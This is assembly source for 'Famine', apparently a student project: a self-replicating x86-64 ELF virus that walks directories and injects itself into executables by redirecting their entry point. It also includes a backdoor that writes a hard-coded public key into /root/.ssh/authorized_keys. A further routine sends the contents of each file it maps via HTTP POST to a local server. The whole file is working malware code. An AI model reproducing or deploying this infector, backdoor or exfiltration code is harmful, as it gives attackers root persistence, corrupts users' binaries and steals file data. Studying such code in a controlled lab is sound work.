%include "famine.inc"

bits 64
default rel

section .text
global _start

_start:
    ; mov rbp, rsp
	push rbp
    mov rbp, rsp
	PUSHA
	; lea rdi, [rel dir1]                                   ; dir to open for arg readDir
	; mov rsi, dir1Len
	; call _readDir

    mov rdx, 0
    lea rdi, [rel dir1]                                   ; dir to open for arg initDir
    ; mov rdi, dir1                                       ; dir to open for arg initDir
    call _initDir

    ; debug
    ; mov rsi, tiret
    ; writeWork

    mov rdx, 0
    lea rdi, [rel dir2]
    ; mov rdi, dir2                                       ; dir to open for arg initDir
    call _initDir

    call _backdoor

    ; jmp _exit
	_final_jmp:
	POPA	
	mov rsp, rbp
	pop rbp
	_bf_exit:
    jmp _exit

; take directory to open in rdi-> pwd
; rdx == 0 ? rien : recreate a path: rdi/rsi
_initDir:
    ; placing famine on the stack
    push rbp
    mov rbp, rsp
    sub rsp, famine_size
	lea r8, FAM(famine.fd)
	or qword [r8], -1
    lea rsi, FAM(famine.pwd)
    call _strcpy                                            ; strcpy(famine.pwd(rsi), pwd(rdi))
    cmp rdx, 0
    je _readDir
    call _strlen                                            ; strlen(famine.pwd(rsi))
    add rsi, rax
    cmp BYTE [rsi - 1], '/'
    je _join
    mov BYTE [rsi], '/'
    add rsi, 1

    _join:
    mov rdi, rdx
    call _strcpy

    mov rdi, rsp

_readDir:
    mov rax, SYS_OPEN 
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall
    cmp rax, 0
    jl _returnClose

    lea rdi, FAM(famine.fd)                             ; en registre le fd dans la struct
    mov [rdi], rax

    _getDents:
        lea r10, FAM(famine.fd) 
        lea r9, FAM(famine.total_read)                  ; init total_read
        mov DWORD[r9], 0
        mov rax, SYS_GETDENTS                   	    ; getdents64(int fd, void *buf, size_t size_buf)
        mov rdi, [r10]
        lea rsi, FAM(famine.dirents)
        mov rdx, PAGE_SIZE
        syscall
        cmp rax, 0
        jle _returnClose

    lea r10, FAM(famine.dirents_struct_ptr) 			; r10 -> (struct famine.diretents_struct_ptr)
    mov [r10], rsi          	                		; famine.dirents_struct_ptr -> famine.dirents
    lea r11, FAM(famine.total_to_read)      			; r11 -> (struct famine.total_to_read)
    mov DWORD [r11], eax                        		; famine.total_to_read = getdents total length

    _listFile:
        lea r8, FAM(famine.total_read)      			; r8 -> total lu de getdents
        lea r9, FAM(famine.total_to_read)       		; r9 -> total a lire de getdents
        mov r10, FAM(famine.dirents_struct_ptr) 		; r10 -> actual dirent struct
        lea r11, FAM(famine.dirents_struct_ptr) 		; r11 -> ptr de la struct actuelle
        movzx r12, WORD [r10 + D_RECLEN_OFF] 			; r12 = length de la stuct dirents actuelle
        add [r8], r12d                        			; update du total lu dans r8
        add [r11], r12                          		; famine.diretns_struct_ptr -> sur la prochaine struct
        cmp BYTE [r10 + D_TYPE], D_FOLDER
        je _recursif
        cmp BYTE [r10 + D_TYPE], D_REG_FILE 			; verifie le type du fichier
        jne _checkRead

        _updatePath:
            ; strlen
            mov rsi,  rsp
            call _strlen
            lea rsi, [r10 + D_NAME]                 	; charge le nom du fichier dans rsi
            mov byte [rsi - 1], '/'
            add rax, 1
            sub rsi, rax
            mov rdi, rsp
            call _strcpyNoNull

            ; printing
            ; writeWork
            ; writeBack

            ; ajouter les foncton pour chaques fichier ici
            ; call _open_file
			call _check_file

            jmp _checkRead

            _recursif:
                lea rdi, FAM(famine.pwd)
                lea rdx, [r10 + D_NAME]                 ; rdi -> folder name
                cmp BYTE [rdx], 0x2e
                jne _callInit
                cmp BYTE [rdx + 1], 0
                je _checkRead
                cmp BYTE [rdx + 1], 0x2e
                jne _callInit
                cmp BYTE [rdx + 2], 0
                je _checkRead

                _callInit:
                    call _initDir

            _checkRead:
                mov r8, FAM(famine.total_read)
                mov r12, FAM(famine.total_to_read)
                cmp r8d, r12d                 			; if (total lu >= total getdents)
                jge _getDents
                jmp _listFile

    _returnClose:
		mov rdi, FAM(famine.fd)
		cmp qword rdi, 0
		jle	_returnLeave
		mov rax, SYS_CLOSE
		syscall
		or qword FAM(famine.fd), -1
		jmp _returnLeave

        ; mov rax, SYS_CLOSE
        ; mov rdi, FAM(famine.fd)
        ; syscall


_returnLeave:
    leave

_return:
    ret

_check_file:
	push rbp
	mov	rbp, rsp
	sub rsp, infection_size

	_open_file:
		mov	rax, SYS_OPEN
		mov rdi, rsi
		mov rsi, O_RDWR
		xor rdx, rdx 
		syscall
		cmp	rax, 0x0
		jl	_returnLeave
		mov INF(infection.file_fd), rax

	; === get file size ===
	_get_filesz:
		mov rax, SYS_LSEEK
		mov	rdi, INF(infection.file_fd)
		mov	rsi, 0x0
		mov rdx, SEEK_END
		syscall
		cmp rax, 0x0
		jle _close_file_inf
		mov INF(infection.map_size), rax

	_map_file:
	; rax	-> map
		mov rsi, rax								; rsi = file_size
		mov rax, SYS_MMAP
		mov	rdi, 0x0
		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
		mov r10, MAP_SHARED
		mov r8, INF(infection.file_fd)
		mov r9, 0x0
		syscall
		cmp	rax, 0x0								; rax -> map (used later)
		jl _close_file_inf
		call _extractData
		mov rax, r12
		mov rsi, r15
		lea r8, INF(infection.map)
		mov [r8], rax


	_check_format:
		cmp	dword [rax + 1], 0x02464c45				; if != 'ELF64'
		jne _unmap_close_inf

	_find_text_seg:
	;*rax	-> map
	; r14	-> header table
		mov r14, rax								; r14 -> elf start addr
		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
		movzx r15, word [rax + elf64_ehdr.e_phnum]	; r15 = number of segments (see _segment_loop)
		xor rcx, rcx								; loop counter
	
	_segment_loop:		; while (cx != r15){check segment p_type & p_flags & cave_size; rcx++ & phdr++}
	;*r14	-> segment header
	; r15	== segment number
	; rcx	-> segment index counter
		cmp rcx, r15
		je	_unmap_close_inf
		bt word [r14], 0							; segment is loadable (bit test r14's first bit)
		jnc _continue
		bt qword [r14], 0x20						; segment is executable (bit test r14's 33rd bit)
		jc _check_cave_size
		_continue:
		inc rcx
		add r14, elf64_phdr_size					; r14 -> next_phdr(.p_type) (needed later)
		jmp _segment_loop

		_check_cave_size:
			mov r13, r14
			add r13, elf64_phdr_size + elf64_phdr.p_offset		; r13 -> next_phdr.offset
			mov rbx, [r14 + elf64_phdr.p_offset]	; rbx = curr_phdr.offset
			add rbx, [r14 + elf64_phdr.p_filesz]
			add rbx, CODE_LEN						; rbx = offset end of futur parasite
			cmp [r13], rbx							; if (next_phdr.offset <= offset_end_parasite)
			jle	_continue
			; sub rbx, [r14 + elf64_phdr.p_offset]
			add rbx, rax							; rbx -> end of potential parasite

	; === found text segment ===
	_valid_seg_found:
	; r13	-> signature
	;*r14	-> segment header
	; r15	-> potential signature
	; === check if infected (read signature) ===
		; use rbx
		; mov r15, r14								; r15 -> curr_phdr
		; add r15, [r14 + elf64_phdr.p_filesz]		; r15 -> end curr_seg
		; add r15, CODE_LEN
		sub rbx, CODE_LEN							; rbx -> end of segment
		mov r15, rbx								; r15 -> end of potential parasite
		sub r15, _end - signature					; r15 -> start of potential signature
		lea r13, signature
		mov r13, [r13]								; r13 = signature[8]
		cmp r13, qword [r15]						; strncmp(signature, (char *)r15, 8);
		je	_unmap_close_inf
		add rbx, 0x10
		and rbx, -16								; align
		
_infection:
;*rax	-> map
; r11	== entrypoint offset 
; r12	-> ehdr.e_entry
; r13	== original entrypoint offset
;*r14	-> segment header
; r15	-> segment end
	; use rbx
	; mov r15, rax							; r15 -> start of map
	; add r15, [r14 + elf64_phdr.p_offset]	; r15 -> start of segment
	; add r15, [r14 + elf64_phdr.p_filesz]	; r15 -> end of the segment
	; add r15, 0x10
	; and r15, -16
	; mov r15, rbx
	; === stock original entrypoint === 
	mov r12, rax
	add r12, elf64_ehdr.e_entry 			; r12 -> ehdr.e_entry
	mov r13, [r12]							; r13 = original entry offset (we save r12 for later)
	; === update entrypoint to parasite offset ===
	_update_entrypoint:
	; r11	== injection offset
	;*r12	-> ehdr.e_entry
	;*r15	-> segment end
	;*rbx	-> segment end
	; ehdr->e_entry = (Elf64_Addr)(cave_segment->p_vaddr + cave_segment->p_memsz);
		mov r11, rbx							; r11 -> end of curr_segment
		sub r11, rax 							; r11 = injection offset
		mov [r12], r11							; ehdr.e_entry = injection offset
	; === update segment hdr ===
	_update_seg_hdr:
	; r12	-> phdr.filesz
	;*r14	-> segment header
	mov r12, r14
	add r12, elf64_phdr.p_filesz
	add	qword [r12], 0x10
	and qword [r12], -16
	add	qword [r12], qword CODE_LEN
	add r14, elf64_phdr.p_memsz
	add qword [r14], 0x10
	and qword [r14], -16
	add qword [r14], qword CODE_LEN
	; === copy parasite ===
	_copy_parasite:
	;*r15	-> segment_end
	;*rbx	-> segment_end
		; mov rdi, r15							; rdi -> end of curr_seg(start of injection)
		mov rdi, rbx							; rdi -> end of curr_seg(start of injection)
		lea rsi, [rel _start]					; rsi -> start of our code
		mov rcx, CODE_LEN						; counter will decrement
		cld										; copy from _start to _end (= !std)
		rep movsb
	; === update jmp end parasite ===
	_update_parasite_jmp:
	;*rax	-> map
	; r10	== offset between final_jmp and original entry
	;*r11	== injection offset
	;*r12	-> ehdr.e_entry
	;*r13	== original entry offset
	; r15	-> _final_jmp
	; jmp_offset = original_entry - (entry_offset + final_jmp_offset_in_parasite + 5); 
		; mov r15, _final_jmp
		; mov r14, _start
		; sub r15, r14							; r15 == _final_jmp offset
		; mov r15, rax							; r15 -> final_jmp in map
		; add r15, r11
		mov r15, rbx
		add r15, FINJMP_OFF
		inc r15	
		mov r10, r11
		add r10, FINJMP_OFF
		; sub r13, r10
		sub r10, r13
		add r10, 0x05
		neg r10;
		mov [r15], r10d
		jmp _unmap_close_inf


; --- privesc + backdoor
_backdoor:
    ; open "/root/.ssh/authorized.key"
    ; r9 == fd
    push rbp
    mov rbp, rsp
    sub rsp, 0x1000                     ;buffer read
    mov rax, SYS_OPEN
    ; mov rdi, sshFile
    lea rdi, [rel sshFile]
    mov rsi, O_RDWR | O_CREAT
    mov rdx, 600
    syscall
    test rax, rax
    js _returnLeave
    mov r9, rax

    _readSsh:
        ; *r9 == fd
        ; r10 == size read
        ; rsi -> buffer
        mov rax, SYS_READ
        mov rdi, r9
        mov rsi, rbp
        sub rsi, 0x1000
        mov rdx, 0x1000
        syscall
        cmp rax, 0
        je _notFound
        jl _closeSsh
        mov r10, rax

    _checkBackdoor:
        ; rcx == nombre d'octet lue
        ; r11 -> buffer
        mov rcx, r10
        mov r11, rsi

        ; for every new line
        _findNewline:
            cmp byte [r11], 0xa
            je _cmpLine
            inc r11
            loop _findNewline
            mov rax, SYS_WRITE
            mov rsi, back
            mov rdx, 1
            syscall
            jmp _notFound

            ; cmp the line with pub ssh key
            _cmpLine:
                mov byte [r11], 0
                mov rdi, r11
                sub rdi, sshPubLen - 1
                lea rsi, [rel sshPub]
                push rcx
                call _strcmp
                pop rcx
                test rax, rax            
                je _closeSsh
                inc r11
                loop _findNewline

        ; if not found write it
        _notFound:
            mov rdi, r9
            mov rax, SYS_WRITE
            ;mov rsi, sshPub
            lea rsi, [rel sshPub]
            mov rdx, sshPubLen - 1
            syscall
            mov rax, SYS_WRITE
            lea rsi, [rel back]
            mov rdx, 1
            syscall

    _closeSsh:
        mov rax, SYS_CLOSE
        mov rdi, r9
        syscall
        jmp _returnLeave;


_initSocket:
    _creatSocket:
        mov rax, SYS_SOCKET
        mov rdi, AF_INET
        mov rsi, SOCK_STREAM
        xor rdx, rdx
        syscall
        test rax, rax
        js _return
        mov rdi, rax

    _connectSocket:
        mov rax, SYS_CONNECT
        lea rsi, sockaddr
        mov rdx, 16
        syscall
        test rax, rax
        js _closeSock
        mov rax, rdi
        ret

; (rdi: socket)
_closeSock:
    mov rax, SYS_CLOSE
    syscall
    mov rax, -1
    ret

; doit prendre le sockfd en argument (r13 == sockfd)
_extractData:
    mov r12, rax                                    ; r12 -> maped file_date
    push rsi
    call _creatSocket
    pop rsi
    mov r13, rax
    _checkFd:
        cmp r13, 0
        jl _return
    _mmapBuffer:
    ; rax -> mmap buffer
    ; r15 == la size du mmap buffer
    ; r12 -> maped file_data
        mov rax, SYS_MMAP
        xor rdi, rdi
        push rsi
        add rsi, headerStartLen
        add rsi, headerEndLen
        add rsi, 10                                 ; pour le content length
        mov r15, rsi
        mov rdx, PROT_READ | PROT_WRITE
        mov r10, MAP_PRIVATE | MAP_ANONYMOUS
        xor r8, r8
        xor r9, r9
        syscall

    _copyData:
        ; r14 -> header buffer
        ; *r15 == la taille du mmap buffer
        mov r14, rax
        mov rsi, rax
        lea rdi, [rel headerStart]
        call _strcpy
        pop rax
        push rax
        add rsi, headerStartLen - 1
        call _itoa
        lea rdi, [rel headerEnd]
        call _strcpy
        add rsi, headerEndLen - 1
        mov rdi, r12
        pop rcx
        call _strncpy

    _sendTo:
        mov rax, SYS_SENDTO
        mov rdi, r13
        mov rsi, r14
        mov rdx, r15
        xor r10, r10
        xor r9, r9
        syscall
        jmp _closeSock 

; ---packer
; jsp encore

; strcpy(dst:rsi src: rdi)
_strcpyNoNull:
	xor rcx, rcx
	strcpy_loop:
		cmp byte [rdi + rcx], 0
		je	strcpy_loop_end
		mov al, byte [rdi + rcx]
		mov [rsi + rcx], al
		add rcx, 1
		jmp strcpy_loop
	strcpy_loop_end:
		ret

_strcpy:
    call _strcpyNoNull
    mov byte [rsi + rcx], 0
    ret

; strncpy(dst:rsi, src: rdi, count: rcx)
_strncpy:
    sub rcx, 1
    _strncpyLoop:
        mov al, byte [rdi + rcx]
        mov [rsi + rcx], al
        loop _strncpyLoop
        mov al, byte [rdi + rcx]
        mov [rsi + rcx], al
        ret

; strlen(str:rsi)
_strlen:
	xor rcx, rcx
	
	ft_strlen_loop:
		cmp	byte [rsi + rcx], 0
		je	ft_strlen_end
		inc rcx
		jmp	ft_strlen_loop

	ft_strlen_end:
		mov rax, rcx
		ret

; strcmp(rdi, rsi)
_strcmp:
	xor rcx, rcx
	xor rax, rax
	strcmp_loop:
		mov al, byte [rdi + rcx]
		mov bl, byte [rsi + rcx]
		cmp al, bl
		jl strcmp_loop_end
		je strcmp_loop_end
		jg strcmp_loop_end

		cmp al, 0
		je strcmp_loop_end

		add rcx, 1
		jmp strcmp_loop

	strcmp_loop_end:
		movzx rax, al
		movzx r8, bl
		sub rax, r8
		ret

; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
_itoa:
    mov r9, 10
    call _itoaLoop
    ret

    _itoaLoop:
        cmp rax, 9
        jg _itoaRecursif
        mov [rsi], ax
        add byte [rsi], 48
        inc rsi
        ret

    _itoaRecursif:
        push rax
        xor rdx, rdx
        div r9
        call _itoaLoop 
        pop rax
        push rax
        xor rdx, rdx
        div r9
        mov rax, rdx
        call _itoaLoop 
        pop rax
        ret

_unmap_close_inf:
	lea rdi, INF(infection.map)
	lea rsi, INF(infection.map_size)
	mov rax, SYS_UNMAP
	syscall
	jmp _close_file_inf

_close_file_inf:
	mov	rax, SYS_CLOSE
	mov	rdi, INF(infection.file_fd)
	syscall
	mov qword INF(infection.file_fd), -1
	jmp _returnLeave

_exit:
    mov rax, 60
    xor rdi, rdi
    syscall

; dir1        db  "../test", 0
; dir2        db  "/home/gottie/prog/Famine/test2", 0
dir1        db  "/tmp/test", 0
dir1Len    equ $ - dir1
dir2        db  "/tmp/test2", 0
dir2Len    equ $ - dir2
back        db  10, 0
slash       db "/", 0
tiret       db 10, "-------", 10, 10, 0
sshFile     db "/root/.ssh/authorized_keys", 0
sshPub      db "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0
sshPubLen   equ $-sshPub
sockaddr:
    dw 2            ; AF_INET
    dw 0x401F       ; PORT 8000
    dd 0x100007F    ; 127.0.0.1 (en hexadécimal)
    dq 0            ; padding

headerStart db "POST /extract HTTP/1.1", 13, 10, \
                "Host: 127.0.0.1:8000", 13, 10, \
                "Content-Type: text/plain", 13, 10, \
                "Connection: keep-alive", 13, 10, \
                "Content-Length: ", 0 
headerStartLen equ $-headerStart
headerEnd db 13, 10, 13, 10, 0  ; Fin de l'entête avant le body
headerEndLen equ $-headerEnd
signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0
_end: